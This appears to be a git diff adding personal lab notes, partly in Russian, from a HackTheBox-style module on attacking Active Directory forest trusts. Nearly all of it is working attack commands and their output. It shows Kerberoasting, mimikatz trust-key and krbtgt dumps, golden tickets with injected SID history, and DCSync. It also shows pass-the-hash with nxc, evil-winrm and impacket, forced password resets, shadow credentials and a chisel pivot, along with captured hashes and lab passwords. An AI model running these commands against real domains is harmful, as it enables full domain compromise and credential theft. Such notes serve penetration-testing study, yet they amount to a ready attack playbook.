@@ -391,6 +391,382 @@ Password: HTB_@cademy_stdnt!
 
 
 # За лесом
+************************************
+# За лесом
+
+# Выполнение атаки Кербероастингом через лес 
+Выполните Kerberoasting в отношении логистической области.
+
+        PowerShell-сессия 
+PS C:\Tools> .\Rubeus.exe kerberoast /domain:logistics.ad
+
+# Trust Account Attack
+Enumerating the Trust
+
+        PowerShell-Session
+PS C:\Tools> Get-ADTrust -Identity megacorp.ad 
+
+PS C:\Tools> .\mimikatz.exe
+
+.#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
+.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+'#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz # lsadump::trust /patch
+Current domain: LOGISTICS.AD (LOGISTICS / S-1-5-21-186204973-2882451676-2899969076)
+Domain: MEGACORP.AD (MEGACORP / S-1-5-21-983561975-2685977214-3442977283)
+[  In ] LOGISTICS.AD -> MEGACORP.AD
+[ Out ] MEGACORP.AD -> LOGISTICS.AD
+* 3/9/2024 4:08:15 AM - CLEAR   - 6e 00 7a 00 67 00 28 00 59 00 64 00 4f 00 6e 00 26 00 61 00 4f 00 3e 00 24 00 2d 00 31 00
+* aes256_hmac       7ff5417ab7c7500896046133c9505d6a49425bd548a4db076a3e9df702f194eb
+* aes128_hmac       74fcfa250608b60297e35bc3763a60db
+* rc4_hmac_nt       68e456d3a95cc748ac5a2eae679b9c91
+[ In-1] LOGISTICS.AD -> MEGACORP.AD
+[Out-1] MEGACORP.AD -> LOGISTICS.AD
+* 3/9/2024 4:08:15 AM - CLEAR   - 6e 00 7a 00 67 00 28 00 59 00 64 00 4f 00 6e 00 26 00 61 00 4f 00 3e 00 24 00 2d 00 31 00
+* aes256_hmac       7ff5417ab7c7500896046133c9505d6a49425bd548a4db076a3e9df702f194eb
+* aes128_hmac       74fcfa250608b60297e35bc3763a60db
+* rc4_hmac_nt       68e456d3a95cc748ac5a2eae679b9c91
+
+mimikatz #  
+
+Requesting a Ticket for logistics$
+
+        PowerShell-Session
+PS C:\Tools> .\Rubeus.exe asktgt /user:logistics$ /domain:megacorp.ad /rc4:68e456d3a95cc748ac5a2eae679b9c91 /ptt
+
+Using SharpHound to enumerate Megacorp domain
+
+        PowerShell-Session
+PS C:\Tools> .\SharpHound.exe -c All -d megacorp.ad 
+Perform Kerberoasting on Megacorp domain
+
+        PowerShell-Session
+PS C:\Tools> .\Rubeus.exe kerberoast /domain:megacorp.ad
+Request a Ticket for white.beard
+
+        PowerShell-Session
+PS C:\Tools> .\Rubeus.exe asktgt /user:white.beard /password:<SNIP> /domain:megacorp.ad /ptt                                                                   
+Access Megacorp domain using PSSession
+
+        PowerShell-Session
+PS C:\Tools> New-PSSession DC03.megacorp.ad 
+
+# Unconstrained Delegation Cross Forest
+
+Monitoring Tickets with Rubeus
+
+        PowerShell-Session
+PS C:\Tools> .\Rubeus.exe monitor /interval:5 /nowrap
+
+PS C:\Tools> .\SpoolSample.exe dc02.logistics.ad dc01.inlanefreight.ad
+Renew a ticket for DC02$
+
+        PowerShell-Session
+PS C:\Tools> .\Rubeus.exe renew /ticket:doIFFDCCBRCgAwIBBaEDAgEWooIEHDCCBBhhggQUMIIEEKADAgEFoQ4bDExPR0lTVElDUy5BRKIhMB+gAwIBAqEYMBYbBmtyYnRndBsMTE9HSVNUSUNTLkFEo4ID1DCCA9CgAwIBEqEDAgECooIDwgSCA76oZ/uHov/bLTKCl1aFHEzeTTa8z5kb9PNh7AJgswqto5AmssLu69EpIy2pvLiYsndNeW5hS5kqSU1Y3uxv2t9FZ4K0uNksidu3BbSouJHZOiK1CFq8/E2eX/h3BDXs2/nLxo8yJuVsNkmAUQt8HmGXDmLeF9q6VwwTZOnYHe7H+wKty5PzfBorCLMT0OcZu+Z80JsD17DeEWAYmGLOf3fJLshMvvGjyjRc45tqNM8jcU/J0zoDxj59EJOfEUZNF6YfZVc8GXU2lABKzaof3xLNgfV5KqGKyHkWOP1dDau//ITsDTe0Hh5ccIAS13z1xo2YxzVE013dHjcwek7jlmnMX5mxXlK/SljTHsL+712+cJmzJo9CN99aYsYN/e1ZQ/EL84E+bhdNKHS0kaWm3Jakad/UAhP6136/Cf73dSDt754bo/m41oifs7zFA8D5KKrDllDFLxG0+rif9pV1/9rPPLVQdHQUCLWsvURLfGjSsxUjKb0yjZxxBC1M7ybj/7ewTLV+CEOkeq15AKP7MMRblhGcfx5ufFbRIz9zEUOhK5DAR3on3JUev+jMVWLLM6ba9kjTEXj1sNt9ZmIdK+hk2SMLKDSkBT34fJGmuyZyq09w8r80eWJqYJoAAtm1hZmc5+yGAul0JgCPyL0ZAJXOQdS+ut8VMe1Tf1P5/W+ZruKI4yNMPYzjLwyZEWaTu3i9ErdqxNQkMsxqWNMCPC/epjhzNWicoM9Lf7+A/ZKAiVfaGh0lpp8+zqKNwTHQSeZEE/2xbtW03/E3Xw87prBGWB19GiFr8j3ZGtSqTbkO/P9EB<SNIP> /ptt
+
+Verify Ticket in Memory
+
+        PowerShell-Session
+PS C:\Tools> klist
+
+# SID History Injection Attack
+
+## Case-1: High Privileged Migrated User
+Enumerate Users with SIDHistory Enabled
+
+        PowerShell-Session
+PS C:\Tools>  Get-ADUser -Filter "SIDHistory -Like '*'" -Properties SIDHistory
+
+Reset password for sentinal
+
+        PowerShell-Session
+PS C:\Tools net user sentinal sentinal
+The command completed successfully.
+
+Create a Sacrificial Logon Session with Rubeus
+
+        PowerShell-Session
+PS C:\Tools> ./Rubeus createnetonly /program:powershell.exe /show
+
+Requesting TGT for sentinal using Rubeus
+
+        PowerShell-Session
+PS C:\Tools> .\Rubeus.exe asktgt /user:sentinal /password:sentinal /domain:inlanefreight.ad /ptt
+
+Verify the ticket in memory
+
+        PowerShell-Session
+
+PS C:\Tools> klist.exe
+Get access on DC02
+
+        PowerShell-Session
+PS C:\Tools> Enter-PSSession DC02.logistics.ad
+
+## Case-2: Low Privileged Migrated User
+
+Enumerate if SID History is enabled
+
+        PowerShell-Session
+PS C:\Tools> Import-Module .\PowerView.ps1
+PS C:\Tools> Get-DomainTrust -domain logistics.ad
+SourceName      : logistics.ad
+TargetName      : inlanefreight.ad
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : TREAT_AS_EXTERNAL,FOREST_TRANSITIVE
+TrustDirection  : Bidirectional
+WhenCreated     : 12/26/2023 4:13:40 PM
+WhenChanged     : 3/13/2024 1:02:44 PM                      
+
+Retrieve only TrustAttributes for Domain
+
+        PowerShell-Session
+PS C:\Tools> Get-DomainTrust -domain logistics.ad | Where-Object {$_.TargetName -eq "inlanefreight.ad"} | Select TrustAttributes
+
+TrustAttributes
+---------------
+TREAT_AS_EXTERNAL,FOREST_TRANSITIVE        
+
+Using SharpHound to enumerate Logistics domain
+PS C:\Tools\SharpHound-v1.1.1-debug> .\SharpHound.exe -c All -d logistics.ad
+To perform this attack, we need the following:
+
+    The KRBTGT hash for the current domain (Inlanefreight)
+    The SID for the current domain
+    The name of a target user in the current domain (Any domain user)
+    The FQDN of the current domain.
+    The SID of the high privileged group of the target domain (Infrastructure group)
+    
+    PS C:\Tools> .\mimikatz.exe "lsadump::dcsync /user:INLANEFREIGHT\krbtgt" exit
+    Obtain SID of the Current Domain
+
+        PowerShell-Session
+PS C:\Tools> Import-Module .\PowerView.ps1
+PS C:\Tools> Get-DomainSID
+S-1-5-21-2432454459-173448545-3375717855
+
+Obtain SID of the Infrastructure group of Logistics Domain
+
+        PowerShell-Session
+PS C:\Tools> Get-ADGroup -Identity "Infrastructure" -Server "logistics.ad"
+DistinguishedName : CN=Infrastructure,CN=Users,DC=logistics,DC=ad
+GroupCategory     : Security
+GroupScope        : Universal
+Name              : Infrastructure
+ObjectClass       : group
+ObjectGUID        : fe42a45c-a42c-4945-98ca-57446ab9430a
+SamAccountName    : Infrastructure
+SID               : S-1-5-21-186204973-2882451676-2899969076-2602
+
+At this point, we have gathered the following data points:
+
+    The KRBTGT hash for the current domain (Inlanefreight) - 119885a9af438d1ef0d7543bed8b9ea1
+    The SID for the current domain - S-1-5-21-2432454459-173448545-3375717855
+    The name of a target user in the current domain (Any domain user) - jimmy
+    The FQDN of the current domain. - inlanefreight.ad
+    The SID of the high privileged group of the target domain (Infrastructure group) - S-1-5-21-186204973-2882451676-2899969076-2602
+
+With this data collected, the attack can be performed with both Rubeus or Mimikatz.
+Constructing a Golden Ticket using Rubeus
+
+        PowerShell-Session
+PS C:\Tools> .\Rubeus.exe golden /rc4:119885a9af438d1ef0d7543bed8b9ea1 /domain:inlanefreight.ad /sid:S-1-5-21-2432454459-173448545-3375717855 /sids:S-1-5-21-186204973-2882451676-2899969076-2602 /user:jimmy /ptt
+
+Verify the ticket in memory
+
+        PowerShell-Session
+PS C:\Tools> klist
+
+Get access on DC02
+
+        PowerShell-Session
+PS C:\Tools> dir \\DC02.logistics.ad\c$
+Directory: \\DC02.logistics.ad\c$
+
+# SID Filter Bypass (CVE-2020-0665)
+mxdelta@htb[/htb]$ python3 ftinfo.py 
+
+# Abusing SQL Server Links
+Enumerate SQL Server Links
+
+        PowerShell-Session
+PS C:\Tools> import-module .\PowerUpSQL.ps1
+PS C:\Tools> Get-SQLServerLink
+
+Enumerate login rights for Jimmy
+
+        PowerShell-Session
+PS C:\Tools> Get-SQLQuery  -Query "EXEC sp_helplinkedsrvlogin"
+Linked Server    Local Login         Is Self Mapping Remote Login
+-------------    -----------         --------------- ------------
+SQL02\SQLEXPRESS inlanefreight\jimmy           False sa
+
+# Abusing Foreign Security Principals & ACLs
+
+# Abusing PAM Trusts
+Enumerating Shadow Principals
+
+        PowerShell-Session
+PS C:\Tools> Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl
+Accessing Eulogistics as Administrator
+
+        powershell
+PS C:\Tools> whoami;hostname
+controlcenter\administrator
+DC01
+PS C:\Tools> ls \\DC-EU.eulogistics.corp\c$
+
+    Directory: \\DC-EU.eulogistics.corp\c$
+    
+
+
+
+
+
+
+
+
+
+
+Get-ADUser -Filter * -Server "CHILD-DC.child.inlanefreight.ad"
+
+# Злоупотребление правами иностранных принципалов ACL
+ 
+xfreerdp /u:htb-student /p:HTB_@cademy_stdnt /v:10.129.71.9 /dynamic-resolution /drive:share,/home/max/share
+
+./Rubeus createnetonly /program:powershell.exe /show
+.\Rubeus.exe asktgt /user:htb-student /password:HTB_@cademy_stdnt /domain:child.inlanefreight.ad /ptt
+Get-ADGroupMember "SVC_ADMINS" -Server INLANEFREIGHT.AD
+Get-DomainGroupMember -Identity 'SVC_ADMINS' -Domain inlanefreight.ad -Verbose
+
+для юзера ---
+Import-Module .\PowerView.ps1
+$pass = ConvertTo-SecureString 'Test@1234!!!' -AsPlainText -Force
+Set-DomainUserPassword -identity Administrator -AccountPassword $pass -domain inlanefreight.ad -verbose
+.\Rubeus.exe asktgt /user:Administrator /password:'Test@1234!!!' /domain:inlanefreight.ad /ptt
+
+через powershell
+$pass = ConvertTo-SecureString 'Test@1234' -AsPlainText -Force
+Set-ADAccountPassword -Identity Administrator -Server inlanefreight.ad -NewPassword $pass -Reset
+
+для группы --- добавление в группу
+Import-Module .\PowerView.ps1
+Add-DomainGroupMember -identity 'Administrators' -Members 'child\htb-student' -Domain inlanefreight.ad -Verbose
+in kali - sudo ~/Downloads/chisel client 10.129.71.9:8080 socks
+ 
+ proxychains xfreerdp /u:htb-student /p:HTB_@cademy_stdnt /v:172.16.114.3 /dynamic-resolution /drive:share,/home/max/share
+and search flag in admin desctop
+
+
+***********************************
+	EXTRA SID
+проверка включена ли sid история в домене
+
+
+Import-Module .\PowerView.ps1	
+
+Get-DomainTrust -domain APEXCARGO.AD	
+
+Get-DomainTrust -domain APEXCARGO.AD | Where-Object {$_.TargetName -eq "inlanefreight.ad"} | Select TrustAttributes
+
+# The results show the presence of TREAT_AS_EXTERNAL within the TrustAttributes field, indicating that SID History is indeed still enabled in the domain.
+
+To perform this attack, we need the following:
+    The KRBTGT hash for the current domain (INLANEFREIGHT.AD)
+    The SID for the current domain (INLANEFREIGHT.AD)
+    The name of a target user in the current domain (Administrator)
+    The FQDN of the current domain. (INLANEFREIGHT.AD)
+    The SID of the high privileged group of the target domain (HR_MANAGEMENT)
+
+We are attacking from INLANEFREIGHT.AD to DC03.apexcargo.ad!!!!
+
+.\mimikatz.exe "lsadump::dcsync /user:INLANEFREIGHT\krbtgt" exit
+6f639a6054a3d9852409e9ad7e41893b
+
+Import-Module .\PowerView.ps1
+
+PS C:\Tools> Get-DomainSID -Domain INLANEFREIGHT.AD
+S-1-5-21-1407615112-106284543-3058975305
+
+Get-ADGroup -Identity 'HR_MANAGEMENT' -Server "APEXCARGO.AD"
+S-1-5-21-990245489-431684941-3923950027-1112
+
+ .\Rubeus.exe golden /rc4:6f639a6054a3d9852409e9ad7e41893b /domain:INLANEFREIGHT.AD /sid:S-1-5-21-1407615112-106284543-3058975305 /sids:S-1-5-21-990245489-431684941-3923950027-1112 /user:Administrator /ptt
+
+ mimikatz # lsadump::dcsync /domain:APEXCARGO.AD /user:Administrator
+
+
+proxychains nxc smb 172.16.114.10 -u Administrator -H 2cd9f13c4aa3b468308525a93696e5a1 -X "cat C:\Users\Administrator\Desktop\flag.txt"
+proxychains xfreerdp /v:172.16.114.10 /u:Administrator /pth:2cd9f13c4aa3b468308525a93696e5a1 /dynamic-resolution /drive:share,/home/max/share
+
+Enter-PSSession DC03.apexcargo.ad
+**************************************************************
+# Атака на доверенный аккаунт ***************  атакуем MSSP.AD --> [ Out ] MSSP.AD -> APEXCARGO.AD
+
+proxychains evil-winrm -i 172.16.114.10 -u administrator -H 2cd9f13c4aa3b468308525a93696e5a1
+upload tools.zip
+Expand-Archive -Path "tools.zip" -DestinationPath ".\tools"
+
+ Get-ADTrust -Identity mssp.ad
+ 
+ Extracting the Forest Trust Keys
+ загружаем mimikatz.exe
+ 
+ printf 'use C$\ncd Windows\\Temp\nput /home/max/share/mimikatz.exe\nls mimikatz.exe\nexit\n' | proxychains smbclient.py APEXCARGO.AD/Administrator@172.16.114.10 -hashes :2cd9f13c4aa3b468308525a93696e5a1
+ 
+proxychains nxc smb 172.16.114.10 -u Administrator -H 2cd9f13c4aa3b468308525a93696e5a1 -x 'C:\Windows\Temp\mimikatz.exe "privilege::debug" "lsadump::trust /patch /name:MSSP.AD" "exit"'
+
+ proxychains nxc smb 172.16.114.10 -u Administrator -H 2cd9f13c4aa3b468308525a93696e5a1 -x 'C:\Users\Administrator\Documents\tools\mimikatz.exe "privilege::debug" "lsadump::trust /patch /name:MSSP.AD" "exit"'
+ [ Out ] MSSP.AD -> APEXCARGO.AD * rc4_hmac_nt       dfa31016f0e6c91ef6e0b724a7457c0e
+ 
+proxychains nxc ldap 172.16.114.10 -u Administrator -H 2cd9f13c4aa3b468308525a93696e5a1 -d APEXCARGO.AD --get-sid
+Domain SID S-1-5-21-990245489-431684941-3923950027
+
+ 
+ [ Out ] MSSP.AD -> APEXCARGO.AD
+ * rc4_hmac_nt       dfa31016f0e6c91ef6e0b724a7457c0e
+ 9384875ff5e9f363a7bde305b72e2f7e
+ получаем билет MSSP.AD
+ 
+ proxychains getTGT.py MSSP.AD/'APEXCARGO$' -hashes :9384875ff5e9f363a7bde305b72e2f7e -dc-ip 172.16.114.15
+
+проверка работы билета
+
+KRB5CCNAME=APEXCARGO\$.ccache proxychains GetADUsers.py -k -no-pass -dc-ip 172.16.114.15 MSSP.AD/'APEXCARGO$' -all
+
+меняем пароль 
+
+KRB5CCNAME=APEXCARGO\$.ccache proxychains bloodyAD -k -d mssp.ad --host DC04.mssp.ad --dc-ip 172.16.114.15 -u 'APEXCARGO$' set password harry 'Test@1234!' 
+
+проверяем изменения
+
+proxychains nxc smb 172.16.114.15 -u harry -p 'Test@1234!' --shares
+proxychains nxc smb 172.16.114.15 -u harry -p 'Test@1234!' -x "C:\Users\Administrator\Desktop\flag.txt"
+proxychains nxc smb 172.16.114.15 -u harry -p 'Test@1234!' -x "type C:\Users\Administrator\Desktop\flag.txt"
+*****************************************
+учетные записи в другом домене
+
+bloodyAD --host DC05.fabricorp.ad -d fabricorp.ad -u 'harry@mssp.ad' -p 'Test@1234!' set object ALEX servicePrincipalName -v 'HTTP/alex.fabricorp.ad'
+
+ proxychains bloodyAD -d mssp.ad -u 'harry' -p 'Test@1234!' --host DC05.fabricorp.ad --dc-ip 172.16.114.20 set object ALEX servicePrincipalName -v 'HTTP/alex.fabricorp.ad'
+proxychains bloodyAD -d mssp.ad -u 'harry' -p 'Test@1234!' --host DC05.fabricorp.ad --dc-ip 172.16.114.20 set password ALEX 'Test@1234!'
+proxychains nxc ldap 172.16.114.20 -d fabricorp.ad -u ALEX -p 'Test@1234!' --users
+
+proxychains bloodyAD -d fabricorp.ad -u ALEX -p 'Test@1234!' --host DC05.fabricorp.ad --dc-ip 172.16.114.20 add shadowCredentials 'DC05$'
+
+NT: 4b61e8dc1702261873c1775480ac1a0f
+
+
+proxychains impacket-secretsdump -hashes :4b61e8dc1702261873c1775480ac1a0f 'fabricorp.ad/DC05$@172.16.114.20' -just-dc-user Administrator
+
+proxychains impacket-wmiexec -hashes :288d7f5ef7d82e5fabc5227e99faa5c6 'fabricorp.ad/Administrator@172.16.114.20' 'type C:\Users\Administrator\Desktop\flag.txt'
+.
+
+
 Enumerate Users with SIDHistory Enabled
 
 Get-ADUser -Filter * -Server "CHILD-DC.child.inlanefreight.ad"
